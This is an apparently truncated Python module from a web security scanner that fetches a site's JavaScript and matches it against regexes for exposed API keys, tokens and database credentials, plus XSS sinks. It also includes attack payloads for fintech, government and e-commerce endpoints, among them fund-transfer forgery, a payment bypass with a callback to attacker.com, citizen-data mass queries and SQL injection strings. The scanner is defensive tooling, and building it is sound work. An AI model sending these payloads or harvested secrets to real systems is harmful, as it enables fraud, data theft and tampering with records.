import asyncio
import re
import httpx
from urllib.parse import urlparse, urljoin
from scanner.modules.base import BaseModule
from scanner.models import Finding


SECRET_PATTERNS = {
    "AWS Access Key": {
        "pattern": r"(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "AWS Secret Key": {
        "pattern": r"(?:aws_secret_access_key|aws_secret_key)\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})['\"]?",
        "severity": "critical",
        "cvss": 9.5,
    },
    "AWS Secret Access Key (Inline)": {
        "pattern": r"(?i)aws.{0,20}['\"][0-9a-zA-Z/+=]{40}['\"]",
        "severity": "critical",
        "cvss": 9.5,
    },
    "Google API Key": {
        "pattern": r"AIza[0-9A-Za-z_-]{35}",
        "severity": "high",
        "cvss": 7.0,
    },
    "Google OAuth Client ID": {
        "pattern": r"[0-9]+-[a-z0-9_]{32}\.apps\.googleusercontent\.com",
        "severity": "medium",
        "cvss": 4.0,
    },
    "Firebase Config": {
        "pattern": r"(?:firebaseConfig|firebase\.initializeApp)\s*\(\s*\{[^}]*apiKey\s*:\s*['\"]([^'\"]+)['\"]",
        "severity": "high",
        "cvss": 7.5,
    },
    "Firebase Database URL": {
        "pattern": r"https://[a-z0-9-]+\.firebaseio\.com",
        "severity": "medium",
        "cvss": 5.0,
    },
    "Firebase Project ID": {
        "pattern": r"(?:projectId|project_id)\s*[=:]\s*['\"]([a-z0-9-]{6,30})['\"]",
        "severity": "medium",
        "cvss": 4.0,
    },
    "Clarity Project ID": {
        "pattern": r"(?:clarity\.init|clarity\s*\(\s*)['\"]([a-z0-9]{10,12})['\"]",
        "severity": "low",
        "cvss": 2.5,
    },
    "Clarity Tracking ID": {
        "pattern": r"https://www\.clarity\.ms/tag/([a-z0-9]{10,12})",
        "severity": "low",
        "cvss": 2.5,
    },
    "Google Tag Manager ID": {
        "pattern": r"(?:(?:googletagmanager|gtm|tagmanager|GTM_ID|GOOGLE_TAG)[^\n]{0,40})GTM-[A-Z0-9]{6,8}",
        "severity": "low",
        "cvss": 2.0,
    },
    "Google Analytics ID": {
        "pattern": r"(?:UA-\d{4,10}-\d{1,4}|(?:(?:gtag|analytics|ga|measurement_id|tracking_id|GOOGLE_ANALYTICS|GA_MEASUREMENT)\s*[\(=:,]\s*['\"]?)G-[A-Z0-9]{10,12})",
        "severity": "low",
        "cvss": 2.0,
    },
    "Stripe Publishable Key": {
        "pattern": r"pk_(test|live)_[a-zA-Z0-9]{20,}",
        "severity": "medium",
        "cvss": 4.0,
    },
    "Stripe Secret Key": {
        "pattern": r"sk_(test|live)_[a-zA-Z0-9]{20,}",
        "severity": "critical",
        "cvss": 9.5,
    },
    "GitHub Token": {
        "pattern": r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "GitHub OAuth": {
        "pattern": r"(?:client_secret|GITHUB_SECRET)\s*[=:]\s*['\"]?([a-f0-9]{40})['\"]?",
        "severity": "critical",
        "cvss": 9.0,
    },
    "GitLab Personal Access Token": {
        "pattern": r"glpat-[0-9a-zA-Z_-]{20}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Firebase Server Key": {
        "pattern": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Slack Token": {
        "pattern": r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "severity": "high",
        "cvss": 7.5,
    },
    "Slack Webhook": {
        "pattern": r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+",
        "severity": "high",
        "cvss": 7.0,
    },
    "Twilio API Key": {
        "pattern": r"SK[a-f0-9]{32}",
        "severity": "high",
        "cvss": 7.0,
    },
    "SendGrid API Key": {
        "pattern": r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
        "severity": "high",
        "cvss": 7.5,
    },
    "Mailgun API Key": {
        "pattern": r"key-[0-9a-zA-Z]{32}",
        "severity": "high",
        "cvss": 7.0,
    },
    "Telegram Bot Token": {
        "pattern": r"\d{8,10}:[a-zA-Z0-9_-]{35}",
        "severity": "high",
        "cvss": 7.5,
    },
    "Heroku API Key": {
        "pattern": r"[hH]eroku.{0,20}['\"][0-9a-f]{32}['\"]",
        "severity": "high",
        "cvss": 7.0,
    },
    "Heroku API Key (UUID)": {
        "pattern": r"[hH]eroku.*[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
        "severity": "high",
        "cvss": 7.0,
    },
    "Private Key (PEM)": {
        "pattern": r"-----BEGIN\s+(RSA|DSA|EC|OPENSSH|ENCRYPTED)?\s*PRIVATE KEY-----",
        "severity": "critical",
        "cvss": 9.5,
    },
    "JWT Token": {
        "pattern": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
        "severity": "high",
        "cvss": 7.0,
    },
    "JWT Secret Assignment": {
        "pattern": r"(?:jwt[_-]?secret|JWT_SECRET|jwtSecret)\s*[=:]\s*['\"]?([^\s'\";\n]{8,})['\"]?",
        "severity": "critical",
        "cvss": 9.5,
    },
    "Auth Token Assignment": {
        "pattern": r"(?:auth[_-]?token|AUTH_TOKEN|authToken|bearer)\s*[=:]\s*['\"]?([a-zA-Z0-9_.\-]{20,})['\"]?",
        "severity": "high",
        "cvss": 7.5,
    },
    "Generic API Key Assignment": {
        "pattern": r"(?:api[_-]?key|apikey|api_secret|api_token)\s*[=:]\s*['\"]?([a-zA-Z0-9_.\-]{16,})['\"]?",
        "severity": "high",
        "cvss": 6.5,
    },
    "Generic Secret Assignment": {
        "pattern": r"(?:secret|secret_key|client_secret|app_secret)\s*[=:]\s*['\"]?([a-zA-Z0-9_.\-]{16,})['\"]?",
        "severity": "high",
        "cvss": 7.0,
    },
    "Generic Token Assignment": {
        "pattern": r"(?:access_token|auth_token|bearer_token|refresh_token)\s*[=:]\s*['\"]?([a-zA-Z0-9_.\-]{16,})['\"]?",
        "severity": "high",
        "cvss": 7.0,
    },
    "Generic Password Assignment": {
        "pattern": r"(?:password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\";\n]{6,})['\"]?",
        "severity": "high",
        "cvss": 7.5,
    },
    "Database Connection String": {
        "pattern": r"(?:mongodb|mysql|postgres|postgresql|redis|amqp)://[^\s'\"<>]{10,}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Database URI with Credentials": {
        "pattern": r"(?:mongodb(?:\+srv)?|mysql|postgres|postgresql|mariadb|cockroachdb|redis|rediss|amqp|amqps|mssql)://[a-zA-Z0-9_.%-]+:[^@\s'\"]{4,}@[^\s'\"<>]+",
        "severity": "critical",
        "cvss": 9.5,
    },
    "JDBC Connection String": {
        "pattern": r"jdbc:(?:mysql|postgresql|mariadb|oracle|sqlserver|sqlite|h2)://[^\s'\"<>]{10,}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "ODBC/DSN Connection String": {
        "pattern": r"(?i)(?:DSN|Driver)\s*=[^;]+;\s*(?:.*?(?:Uid|User\s*Id|UID)\s*=[^;]+;\s*(?:.*?(?:Pwd|Password|PWD)\s*=[^;]+))",
        "severity": "critical",
        "cvss": 9.0,
    },
    "MSSQL Connection String": {
        "pattern": r"(?i)(?:Server|Data\s+Source)\s*=[^;]+;\s*(?:.*?(?:User\s*Id|uid)\s*=[^;]+;\s*(?:.*?(?:Password|pwd)\s*=[^;]+))",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Database Host+Credentials Config": {
        "pattern": r"(?i)(?:db|database|sql|mysql|pg|postgres|mongo|redis)[_.]?(?:host|server|hostname)\s*[=:]\s*['\"][^'\"]+['\"][\s\S]{0,200}?(?:db|database|sql|mysql|pg|postgres|mongo|redis)[_.]?(?:password|passwd|pwd|pass)\s*[=:]\s*['\"][^'\"]{4,}['\"]",
        "severity": "critical",
        "cvss": 9.5,
    },
    "Hardcoded DB Password Assignment": {
        "pattern": r"(?i)(?:db[_-]?pass(?:word)?|database[_-]?pass(?:word)?|sql[_-]?pass(?:word)?|mysql[_-]?pass(?:word)?|pg[_-]?pass(?:word)?|postgres[_-]?pass(?:word)?|mongo[_-]?pass(?:word)?|redis[_-]?pass(?:word)?|rds[_-]?pass(?:word)?)\s*[=:]\s*['\"]?([^\s'\";\n]{4,})['\"]?",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Hardcoded DB Username Assignment": {
        "pattern": r"(?i)(?:db[_-]?user(?:name)?|database[_-]?user(?:name)?|sql[_-]?user(?:name)?|mysql[_-]?user(?:name)?|pg[_-]?user(?:name)?|postgres[_-]?user(?:name)?|mongo[_-]?user(?:name)?|redis[_-]?user(?:name)?|rds[_-]?user(?:name)?)\s*[=:]\s*['\"]?([^\s'\";\n]{2,})['\"]?",
        "severity": "high",
        "cvss": 6.5,
    },
    "SQLite File Path Exposure": {
        "pattern": r"(?i)['\"](?:[./\\]|[a-zA-Z]:)[^'\"]*\.(?:db|sqlite|sqlite3)['\"]",
        "severity": "medium",
        "cvss": 5.0,
    },
    "OpenAI API Key": {
        "pattern": r"sk-[a-zA-Z0-9]{20,}",
        "severity": "critical",
        "cvss": 8.5,
    },
    "Azure Storage Key": {
        "pattern": r"DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{44,}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Azure Client Secret": {
        "pattern": r"(?i)azure.{0,20}client.secret.{0,20}['\"\s][a-zA-Z0-9._%+-]{32,}['\"]",
        "severity": "critical",
        "cvss": 9.0,
    },
    "DigitalOcean Token": {
        "pattern": r"dop_v1_[a-z0-9]{64}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Mapbox Token": {
        "pattern": r"pk\.[a-zA-Z0-9]{60,}",
        "severity": "medium",
        "cvss": 4.0,
    },
    "Algolia API Key": {
        "pattern": r"(?:algolia.*key|ALGOLIA_API_KEY)\s*[=:]\s*['\"]?([a-f0-9]{32})['\"]?",
        "severity": "medium",
        "cvss": 5.0,
    },
    "Square Access Token": {
        "pattern": r"sq0atp-[0-9A-Za-z\-_]{22}",
        "severity": "high",
        "cvss": 7.5,
    },
    "PayPal/Braintree Token": {
        "pattern": r"access_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32}",
        "severity": "critical",
        "cvss": 9.0,
    },
    "Supabase Key": {
        "pattern": r"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]{30,}\.[A-Za-z0-9_-]{30,}",
        "severity": "high",
        "cvss": 7.0,
    },
    "reCAPTCHA Site Key": {
        "pattern": r"(?:sitekey|site_key|recaptcha.*key)\s*[=:]\s*['\"]([a-zA-Z0-9_-]{40})['\"]",
        "severity": "low",
        "cvss": 2.0,
    },
    "ENV Bare Password Leak": {
        "pattern": r"(?i)\b(?:ADMIN[_-]?PASS(?:WORD)?|ROOT[_-]?PASS(?:WORD)?|APP[_-]?PASS(?:WORD)?|USER[_-]?PASS(?:WORD)?|LOGIN[_-]?PASS(?:WORD)?|MASTER[_-]?PASS(?:WORD)?|SECRET[_-]?PASS(?:WORD)?|DEFAULT[_-]?PASS(?:WORD)?|SERVICE[_-]?PASS(?:WORD)?|SMTP[_-]?PASS(?:WORD)?|MAIL[_-]?PASS(?:WORD)?|FTP[_-]?PASS(?:WORD)?|SSH[_-]?PASS(?:WORD)?|LDAP[_-]?PASS(?:WORD)?|AUTH[_-]?PASS(?:WORD)?)\s*[=:]\s*['\"]?([^\s'\";\n#]{4,})['\"]?",
        "severity": "critical",
        "cvss": 9.0,
    },
    "ENV Bare Secret/Key Leak": {
        "pattern": r"(?i)(?:SECRET_KEY|ENCRYPTION_KEY|SIGNING_KEY|MASTER_KEY|PRIVATE_KEY|SESSION_SECRET|COOKIE_SECRET|HASH_SECRET|HMAC_SECRET|CRYPTO_KEY)\s*[=:]\s*['\"]?([^\s'\";\n#]{6,})['\"]?",
        "severity": "critical",
        "cvss": 9.0,
    },
    "ENV Bare API Credential Leak": {
        "pattern": r"(?i)(?:API_SECRET|API_PASSWORD|API_PRIVATE_KEY|WEBHOOK_SECRET|SIGNING_SECRET|CLIENT_SECRET|OAUTH_SECRET)\s*[=:]\s*['\"]?([^\s'\";\n#]{6,})['\"]?",
        "severity": "critical",
        "cvss": 8.5,
    },
}

SENSITIVE_ENDPOINTS = [
    r"/api/v\d+/",
    r"/graphql",
    r"/internal/",
    r"/admin/",
    r"/debug/",
    r"/swagger",
    r"/api-docs",
    r"\.env",
    r"/config\b",
    r"/health",
    r"/metrics",
    r"/status",
]

ENTERPRISE_ROUTE_REGISTRY = {
    "fintech": {
        "label": "FINTECH",
        "severity": "critical",
        "cvss": 9.5,
        "routes": [
            {"path": "/payments/authorize", "label": "Transaction authorization", "manipulation": "payment_bypass"},
            {"path": "/ledger/balance", "label": "Balance/ledger query", "manipulation": "balance_read"},
            {"path": "/kyc/verify", "label": "KYC identity verification", "manipulation": None},
            {"path": "/transfer/internal", "label": "Internal fund transfer", "manipulation": "transfer_forge"},
            {"path": "/auth/mfa/challenge", "label": "MFA challenge endpoint", "manipulation": "mfa_bypass"},
        ],
    },
    "government": {
        "label": "GOV",
        "severity": "critical",
        "cvss": 9.8,
        "routes": [
            {"path": "/citizen/registry", "label": "Citizen registry lookup", "manipulation": "data_exfil"},
            {"path": "/tax/declaration", "label": "Tax declaration service", "manipulation": "record_tamper"},
            {"path": "/benefits/status", "label": "Benefits/welfare status", "manipulation": "status_tamper"},
            {"path": "/identity/validate", "label": "Official ID validation (RG/CPF/CNH)", "manipulation": None},
            {"path": "/portal/admin/config", "label": "Admin portal configuration", "manipulation": "config_override"},
        ],
    },
    "ecommerce": {
        "label": "ECOM",
        "severity": "high",
        "cvss": 8.5,
        "routes": [
            {"path": "/coupons/validate", "label": "Coupon code validation", "manipulation": "coupon_forge"},
            {"path": "/promos/apply", "label": "Promo discount application", "manipulation": "discount_tamper"},
            {"path": "/cart/update", "label": "Cart item/qty update", "manipulation": "price_manipulation"},
            {"path": "/checkout/price-override", "label": "Checkout price override", "manipulation": "price_manipulation"},
            {"path": "/inventory/adjust", "label": "Inventory stock adjustment", "manipulation": "stock_drain"},
            {"path": "/tickets/book", "label": "Ticket/voucher booking", "manipulation": "coupon_forge"},
        ],
    },
    "products": {
        "label": "PROD",
        "severity": "high",
        "cvss": 8.0,
        "routes": [
            {"path": "/products/list", "label": "Full product listing", "manipulation": None},
            {"path": "/products/details", "label": "Product detail (cost/margin leak)", "manipulation": "price_manipulation"},
            {"path": "/products/search", "label": "Search endpoint (SQLi vector)", "manipulation": "sqli_probe"},
            {"path": "/products/pricing/dynamic", "label": "Dynamic pricing logic", "manipulation": "price_manipulation"},
            {"path": "/products/stock/check", "label": "Stock availability check", "manipulation": "stock_drain"},
            {"path": "/admin/products/update", "label": "Admin product update (no auth)", "manipulation": "config_override"},
        ],
    },
}

MANIPULATION_PAYLOADS = {
    "price_manipulation": {
        "label": "Price Manipulation PoC",
        "payload": '{"item_id":"SKU-1337","quantity":1,"unit_price":0.01,"currency":"BRL","discount_override":99.99,"original_price":299.90}',
        "description": "Attacker modifies unit_price or injects discount_override to pay near-zero at checkout",
    },
    "coupon_forge": {
        "label": "Coupon/Voucher Forgery PoC",
        "payload": '{"code":"INTERNAL100OFF","discount_type":"percentage","value":100,"min_purchase":0,"max_uses":9999,"valid_until":"2030-12-31"}',
        "description": "Forged coupon object bypasses validation — 100% discount with unlimited uses",
    },
    "transfer_forge": {
        "label": "Fund Transfer Forgery PoC",
        "payload": '{"from_account":"TARGET-ACCT","to_account":"ATTACKER-ACCT","amount":50000.00,"currency":"BRL","memo":"internal","skip_verification":true}',
        "description": "Attacker crafts internal transfer request to siphon funds if auth is weak",
    },
    "payment_bypass": {
        "label": "Payment Authorization Bypass PoC",
        "payload": '{"transaction_id":"TXN-FAKE-001","amount":0.01,"status":"approved","merchant_id":"SELF","callback_url":"https://attacker.com/webhook"}',
        "description": "Forged approval object with minimal amount and attacker-controlled callback",
    },
    "balance_read": {
        "label": "Balance Exfiltration PoC",
        "payload": '{"account_id":"*","include_history":true,"date_range":{"from":"2020-01-01","to":"2030-12-31"},"format":"csv"}',
        "description": "Wildcard account query to enumerate all balances if IDOR exists",
    },
    "mfa_bypass": {
        "label": "MFA Challenge Bypass PoC",
        "payload": '{"user_id":"target@corp.com","challenge_type":"sms","response":"000000","force_approve":true,"debug_mode":true}',
        "description": "Attempts trivial OTP with debug flags that may skip validation in staging",
    },
    "data_exfil": {
        "label": "Citizen Data Exfiltration PoC",
        "payload": '{"cpf":"*","fields":["name","address","phone","income","dependents"],"limit":1000,"offset":0}',
        "description": "Mass citizen data query exploiting missing pagination limits or wildcard CPF",
    },
    "record_tamper": {
        "label": "Record Tampering PoC",
        "payload": '{"declaration_id":"DEC-2025-TARGET","taxable_income":0,"deductions":999999,"status":"approved","officer_id":"AUTO"}',
        "description": "Modifies tax declaration to zero out income and maximize deductions",
    },
    "status_tamper": {
        "label": "Benefits Status Tampering PoC",
        "payload": '{"citizen_id":"CPF-TARGET","benefit_type":"universal","status":"active","monthly_value":5000,"auto_renew":true}',
        "description": "Activates or elevates benefit status for unauthorized citizen",
    },
    "config_override": {
        "label": "Admin Config Override PoC",
        "payload": '{"setting":"user_registration","value":"open","auth_required":false,"rate_limit":null,"admin_override":true}',
        "description": "Disables authentication and rate limiting via admin config endpoint",
    },
    "stock_drain": {
        "label": "Stock Drain / Bot Attack PoC",
        "payload": '{"product_id":"LIMITED-EDITION-001","action":"reserve","quantity":9999,"session_id":"bot-session","bypass_captcha":true}',
        "description": "Bot reserves all stock to block competitors or resell — inventory exhaustion attack",
    },
    "sqli_probe": {
        "label": "SQL/NoSQL Injection Probe PoC",
        "payload": '{"q":"\\\\\\\\\\"; DROP TABLE products; --","category":"*","sort":"price\\\\\\\\\' OR 1=1--","limit":"9999 UNION SELECT * FROM users--"}',
        "description": "Classic SQL injection payloads in search parameters — tests backend sanitization",
    },
    "discount_tamper": {
        "label": "Discount Rule Tampering PoC",
        "payload": '{"promo_id":"FLASH50","rules":{"min_items":0,"discount_pct":99,"stackable":true,"apply_to":"all"},"override_expiry":"2030-12-31"}',
        "description": "Modifies promotion rules to apply 99% discount to all items with no minimum",
    },
}

REDIS_INFRA_PATTERNS = [
    {"pattern": r"(?:redis|REDIS)(?:_URL|_HOST|_PORT|_URI)\s*[=:]\s*['\"]?([^\s'\"]+)", "label": "Redis connection config"},
    {"pattern": r"(?:6379|redis://)", "label": "Redis port/protocol reference"},
    {"pattern": r"(?:ioredis|redis-client|createClient|RedisClient)", "label": "Redis client library usage"},
    {"pattern": r"(?:CACHE_DRIVER|QUEUE_CONNECTION)\s*[=:]\s*['\"]?redis", "label": "Redis as cache/queue driver"},
]

FALSE_POSITIVE_PATTERNS = [
    r"^[a-f0-9]{32}$",
    r"^[A-Za-z0-9]{4,8}$",
    r"^placeholder",
    r"^example",
    r"^YOUR_",
    r"^REPLACE_",
    r"^xxx",
    r"^test",
    r"^dummy",
    r"^sample",
]

XSS_INJECTION_PATTERNS = [
    {
        "pattern": r"""(?:href|src|action|formaction)\s*=\s*['"]\s*(?:javascript:|data:text/html)""",
        "label": "Dangerous URI scheme in HTML attribute",
        "severity": "high",
        "cvss": 7.5,
    },
    {
        "pattern": r"""\.innerHTML\s*=\s*(?:[^;]*(?:\+\s*\w+|\$\{|`))""",
        "label": "Unsanitized innerHTML assignment with dynamic content",
        "severity": "high",
        "cvss": 7.0,
    },
    {
        "pattern": r"""document\.write\s*\(\s*(?:[^)]*(?:\+\s*\w+|\$\{))""",
        "label": "document.write with concatenated input",
        "severity": "high",
        "cvss": 7.0,
    },
    {
        "pattern": r"""eval\s*\(\s*(?:[^)]*(?:\+\s*\w+|\$\{|window\[|location))""",
        "label": "eval() with dynamic input — code injection risk",
        "severity": "critical",
        "cvss": 9.0,
    },
    {
        "pattern": r"""new\s+Function\s*\(\s*(?:[^)]*(?:\+\s*\w+|\$\{))""",
        "label": "new Function() constructor with dynamic input",
        "severity": "critical",
        "cvss": 9.0,
    },
    {
        "pattern": r"""(?:window\.location|document\.location|location\.href)\s*=\s*(?:[^;]*(?:\+\s*\w+|\$\{|`))""",
        "label": "Open redirect via dynamic location assignment",
        "severity": "medium",
        "cvss": 5.5,
    },
    {
        "pattern": r"""(?:url|uri|redirect|next|return_to|callback)\s*[=:]\s*['"]\s*\+""",
        "label": "URL parameter built via string concatenation — header injection risk",
        "severity": "medium",
        "cvss": 5.0,
    },
    {
        "pattern": r"""\.(?:append|prepend|html|after|before)\s*\(\s*(?:[^)]*(?:\+\s*\w+|\$\{))""",
        "label": "jQuery DOM injection with unsanitized input",
        "severity": "medium",
        "cvss": 6.0,
    },
    {
        "pattern": r"""\.postMessage\s*\([^)]*(?:\+\s*\w+|\$\{|window|document|location)""",
        "label": "postMessage with dynamic content — cross-origin messaging risk",
        "severity": "medium",
        "cvss": 5.0,
    },
    {
        "pattern": r"""addEventListener\s*\(\s*['"]message['"]\s*,\s*(?:function|\()\s*\w*\s*(?:\)|=>)\s*\{(?:(?!origin).){0,200}\}""",
        "label": "Message event listener without origin validation",
        "severity": "medium",
        "cvss": 5.0,
    },
    {
        "pattern": r"""(?:dangerouslySetInnerHTML)\s*=\s*\{""",
        "label": "React dangerouslySetInnerHTML — potential XSS if input is unvalidated",
        "severity": "medium",
        "cvss": 5.5,
    },
]

PRIORITY_JS_FILES = ["main.js", "vendor.js", "runtime.js", "app.js", "chunk-vendors.js", "polyfills.js"]

CORRELATION_HINTS = {
    "AWS Access Key": ["cloud_credential", "iam_pivot", "s3_access"],
    "AWS Secret Key": ["cloud_credential", "iam_pivot", "s3_access", "full_aws_compromise"],
    "AWS Secret Access Key (Inline)": ["cloud_credential", "iam_pivot"],
    "Google API Key": ["cloud_credential", "gcp_access"],
    "Firebase Config": ["nosql_backend", "broken_auth_vector", "firebase_rules_bypass"],
    "Firebase Database URL": ["nosql_backend", "data_exfil_direct"],
    "Firebase Server Key": ["push_notification_abuse", "cloud_credential"],
    "Stripe Secret Key": ["payment_compromise", "financial_theft"],
    "Stripe Publishable Key": ["payment_enumeration"],
    "GitHub Token": ["source_code_access", "ci_cd_pivot", "repo_clone"],
    "GitHub OAuth": ["source_code_access", "ci_cd_pivot"],
    "GitLab Personal Access Token": ["source_code_access", "ci_cd_pivot"],
    "Slack Token": ["internal_comms_access", "social_engineering"],
    "Slack Webhook": ["phishing_vector", "data_exfil_channel"],
    "JWT Token": ["session_hijack", "auth_bypass", "privilege_escalation"],
    "JWT Secret Assignment": ["token_forge", "full_auth_compromise"],
    "Auth Token Assignment": ["session_hijack", "auth_bypass"],
    "Generic Password Assignment": ["credential_reuse", "lateral_movement"],
    "Database Connection String": ["db_direct_access", "data_exfil_direct"],
    "Database URI with Credentials": ["db_direct_access", "data_exfil_direct", "full_db_compromise"],
    "Hardcoded DB Password Assignment": ["db_direct_access", "credential_reuse"],
    "Hardcoded DB Username Assignment": ["db_enumeration"],
    "Private Key (PEM)": ["full_crypto_compromise", "tls_mitm", "ssh_access"],
    "OpenAI API Key": ["api_abuse", "billing_fraud"],
    "SendGrid API Key": ["email_abuse", "phishing_vector"],
    "Twilio API Key": ["sms_abuse", "otp_intercept"],
    "ENV Bare Password Leak": ["credential_reuse", "admin_access"],
    "ENV Bare Secret/Key Leak": ["crypto_compromise", "session_forge"],
    "ENV Bare API Credential Leak": ["api_abuse", "lateral_movement"],
}

HYPOTHESIS_PATTERN_PRIORITY = {
    "nosql_injection": ["Firebase", "Database", "MongoDB"],
    "broken_auth": ["JWT", "Auth", "Token", "Password", "Session"],
    "credential_leak": ["Password", "Secret", "Key", "ENV"],
    "ssrf": ["AWS", "Azure", "Google", "Cloud"],
    "prototype_pollution": ["Generic"],
    "sqli": ["Database", "JDBC", "ODBC", "MSSQL", "SQL"],
    "idor": ["Token", "Auth", "Session"],
    "deserialization": ["JWT", "Token"],
    "path_traversal": ["ENV", "Config"],
    "api_exposure": ["Generic API", "Auth Token", "Endpoint"],
}


class JSSecretsModule(BaseModule):
    name = "js_secrets_scanner"
    phase = "exposure"
    description = "Scan all JavaScript files and inline scripts for exposed API keys, tokens, secrets, and credentials"

    def _reorder_patterns_by_hypothesis(self, hypothesis: dict) -> dict:
        if not hypothesis or not hypothesis.get("priority_vectors"):
            return SECRET_PATTERNS

        priority_keywords = set()
        for vector in hypothesis["priority_vectors"]:
            for kw in HYPOTHESIS_PATTERN_PRIORITY.get(vector, []):
                priority_keywords.add(kw.lower())

        priority_patterns = {}
        normal_patterns = {}

        for name, info in SECRET_PATTERNS.items():
            name_lower = name.lower()
            is_priority = any(kw in name_lower for kw in priority_keywords)
            if is_priority:
                priority_patterns[name] = info
            else:
                normal_patterns[name] = info

        reordered = {}
        reordered.update(priority_patterns)
        reordered.update(normal_patterns)
        return reordered

    async def execute(self, job) -> list:
        findings = []
        all_secrets = []
        js_files = getattr(job, "_js_files", [])
        inline_scripts = getattr(job, "_inline_scripts", [])
        api_endpoints = getattr(job, "_api_endpoints", [])

        hypothesis = getattr(job, "_hypothesis", None)
        if hypothesis and hypothesis.get("priority_vectors"):
            reordered = self._reorder_patterns_by_hypothesis(hypothesis)
            self._active_patterns = reordered
            stack_sig = hypothesis.get("stack_signature", "unknown")
            priority_count = sum(1 for name in reordered if any(
                kw.lower() in name.lower()
                for vec in hypothesis["priority_vectors"]
                for kw in HYPOTHESIS_PATTERN_PRIORITY.get(vec, [])
            ))
            self.log(f"[HYPOTHESIS] Stack={stack_sig} — {priority_count}/{len(reordered)} patterns prioritized for this stack")
        else:
            self._active_patterns = SECRET_PATTERNS
            self.log("[HYPOTHESIS] No stack hypothesis — scanning all patterns equally")

        if not js_files and not inline_scripts:
            self.log("No JS files from browser recon — falling back to page source discovery", "warn")
            js_files, inline_scripts = await self._fallback_discover(job)

        self.log(f"Starting JS secrets scan — {len(js_files)} files, {len(inline_scripts)} inline scripts to analyze")

        sorted_js = self._sort_priority_files(js_files)

        scanned = 0
        all_xss_findings = []
        source_map_findings = []
        file_contents = {}

        async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as client:
            for js_url in sorted_js:
                try:
                    resp = await client.get(js_url)
                    scanned += 1
                    if resp.status_code == 200:
                        content = resp.text
                        file_name = urlparse(js_url).path.split("/")[-1] or js_url
                        self.log(f"Scanning: {file_name} ({len(content)} chars)")
                        file_contents[file_name] = content

                        file_secrets = self._scan_content(content, f"JS file: {file_name}", file_name)
                        all_secrets.extend(file_secrets)

                        endpoints = self._find_endpoints(content)
                        if endpoints:
                            self.log(f"  Found {len(endpoints)} API/endpoint references in {file_name}")

                        xss_hits = self._scan_xss_patterns(content, file_name)
                        all_xss_findings.extend(xss_hits)

                        map_results = await self._check_source_map(client, js_url, file_name, content)
                        source_map_findings.extend(map_results)

                    if scanned % 5 == 0:
                        self.telemetry(requestsAnalyzed=scanned)
                except Exception as e:
                    self.log(f"Error fetching {js_url}: {str(e)}", "warn")

        for i, script_content in enumerate(inline_scripts):
            source_label = f"Inline script #{i + 1}"
            self.log(f"Scanning: {source_label} ({len(script_content)} chars)")
            inline_secrets = self._scan_content(script_content, source_label)
            all_secrets.extend(inline_secrets)
            xss_hits = self._scan_xss_patterns(script_content, source_label)
            all_xss_findings.extend(xss_hits)

        page_source = ""
        try:
            async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as c:
                r = await c.get(job.base_url)
                if r.status_code == 200:
                    page_source = r.text
                    html_secrets = self._scan_content(page_source, "HTML page source")
                    all_secrets.extend(html_secrets)
                    scanned += 1
        except Exception:
            pass

        self.telemetry(requestsAnalyzed=scanned)

        unique_secrets = {}
        seen_positions = {}
        for secret in all_secrets:
            key = f"{secret['type']}:{secret['match'][:30]}"
            pos_key = f"{secret.get('file_name', '')}:{secret.get('position', 0)}"
            if key not in unique_secrets and pos_key not in seen_positions:
                unique_secrets[key] = secret
                seen_positions[pos_key] = secret['type']

        CATEGORY_MAP = {
            "AWS": "infra", "Azure": "infra", "DigitalOcean": "infra",
            "GitHub": "infra", "GitLab": "infra", "Heroku": "infra",
            "OpenAI": "infra", "Supabase": "infra",
            "Stripe": "fintech", "PayPal": "fintech", "Braintree": "fintech",
            "Square": "fintech",
            "Slack": "comms", "Twilio": "comms", "SendGrid": "comms",
            "Mailgun": "comms", "Telegram": "comms",
            "Database": "infra", "JDBC": "infra", "ODBC": "infra",
            "MSSQL": "infra", "Hardcoded DB": "infra", "SQLite": "infra",
            "Firebase": "infra", "Google": "infra", "Mapbox": "infra",
            "Algolia": "infra", "Clarity": "infra",
        }

        def _resolve_category(secret_type: str) -> str:
            for keyword, cat in CATEGORY_MAP.items():
                if keyword.lower() in secret_type.lower():
                    return cat
            return "generic"

        def _resolve_asset_type(secret_type: str) -> str:
            st = secret_type.lower()
            if "token" in st or "jwt" in st or "auth" in st:
                return "token"
            if "key" in st or "api" in st:
                return "key"
            if "password" in st or "secret" in st or "database" in st or "connection" in st or "uri" in st or "jdbc" in st or "odbc" in st or "mssql" in st or "sqlite" in st or "hardcoded db" in st:
                return "secret"
            if "config" in st or "firebase" in st or "clarity" in st:
                return "config"
            return "secret"

        for key, secret in unique_secrets.items():
            raw_value = secret["match"]
            pattern_info = SECRET_PATTERNS.get(secret["type"], {})
            file_name = secret.get("file_name", "unknown")
            approx_line = secret.get("approx_line", "?")
            category = _resolve_category(secret["type"])
            asset_type = _resolve_asset_type(secret["type"])

            hints = CORRELATION_HINTS.get(secret["type"], [])

            f = Finding(
                severity=pattern_info.get("severity", "high"),
